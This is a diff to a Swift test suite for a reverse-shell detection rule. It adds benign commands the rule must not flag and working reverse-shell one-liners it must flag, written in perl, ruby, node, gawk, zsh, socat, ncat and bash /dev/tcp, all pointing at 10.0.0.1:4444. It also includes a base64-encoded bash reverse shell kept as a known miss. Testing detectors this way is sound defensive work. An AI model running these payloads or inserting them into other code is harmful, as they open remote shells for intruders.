@@ -137,10 +137,52 @@ struct ReverseShellRuleCoverageTests {
             "nc -z -w1 example.com 443",                         // nc port check, no -e/-c, no mkfifo
             "mkfifo /tmp/mypipe",                                // mkfifo alone, no nc
             "ssh -L 8080:localhost:80 host",                     // 'connect'-free tunnel
+            // The python_socket |all FP the P1 adversarial verify found: socket +
+            // subprocess + connect + a NON-shell /bin binary. Now requires /bin/sh
+            // or /bin/bash, so this benign CI wait-for-port one-liner is clean.
+            "python3 -c \"import socket,subprocess; socket.create_connection(('127.0.0.1',5432)); subprocess.run(['/bin/echo','up'])\"",
+            "grep -e /bin/sh /etc/shells",                       // grep -e, not ncat -e
+            "socat TCP-LISTEN:8080,fork TCP:localhost:80",       // socat port-forward, no EXEC:
+            "node -e \"require('child_process').execSync('/bin/ls')\"", // child_process, no network leg
         ]
         for cmd in benign {
             let hit = await fires(engine, cmd)
             #expect(!hit, "reverse-shell rule must NOT fire on benign: \(cmd)")
+        }
+    }
+
+    @Test("expanded interpreter/tool coverage from the P1 adversarial verify all fires")
+    func expandedCoverageFires() async throws {
+        let engine = try await engineLoaded()
+        let payloads: [String] = [
+            "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.0.0.1\")));exec(\"/bin/sh -i\");'",  // perl
+            "socat TCP:10.0.0.1:4444 EXEC:/bin/sh",              // socat EXEC
+            "gawk 'BEGIN{s=\"/inet/tcp/0/10.0.0.1/4444\";system(\"/bin/sh\")}'",  // gawk /inet/tcp
+            "ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444);exec sprintf(\"/bin/sh -i <&%d\",f.fileno)'",  // ruby TCPSocket
+            "node -e 'require(\"net\").connect(4444,\"10.0.0.1\",function(){require(\"child_process\").spawn(\"/bin/sh\",[])})'",  // node
+            "zsh -c 'zmodload zsh/net/tcp && ztcp 10.0.0.1 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",  // zsh ztcp
+            "ncat --ssl 10.0.0.1 4444 -e /bin/sh",              // ncat with flags before -e
+            "D=/dev/tcp;bash -i >& $D/10.0.0.1/4444 0>&1",      // /dev/tcp variable-split
+        ]
+        for cmd in payloads {
+            let hit = await fires(engine, cmd)
+            #expect(hit, "reverse-shell rule should fire on: \(cmd)")
+        }
+    }
+
+    @Test("documented behavioral-layer misses do NOT fire (honest boundary, not a regression)")
+    func documentedMissesDoNotFire() async throws {
+        let engine = try await engineLoaded()
+        // These carry no reverse-shell tokens in the process_creation command line
+        // (payload is base64-encoded / lives in a file); a command-line rule
+        // genuinely cannot see them. Asserted so the boundary is explicit.
+        let misses: [String] = [
+            "bash -c \"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 --decode | bash\"",
+            "bash /tmp/.cache/update.sh",
+        ]
+        for cmd in misses {
+            let hit = await fires(engine, cmd)
+            #expect(!hit, "expected a command-line MISS (behavioral-layer territory): \(cmd)")
         }
     }
 }
